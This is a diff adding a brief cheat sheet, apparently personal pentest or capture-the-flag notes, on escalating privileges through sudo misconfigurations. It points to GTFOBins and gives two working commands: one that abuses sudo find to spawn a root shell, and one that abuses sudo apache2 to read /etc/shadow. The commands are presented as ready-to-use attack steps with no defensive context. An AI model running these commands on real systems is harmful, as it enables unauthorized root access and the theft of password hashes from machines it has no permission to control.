@@ -1,0 +1,16 @@
+##### Escape Sequences for elevating privilages #####
+
+Find programs allowed to run as sudo by : sudo -l
+
+Esc sequenes list : https://gtfobins.github.io/
+
+1) find : 
+	sudo find . -exec /bin/sh \; -quit
+
+2) apache2 : 
+	sudo apache2 -f <sensitive file name>
+	eg : sudo apache2 -f /etc/shadow
+
+
+
+	
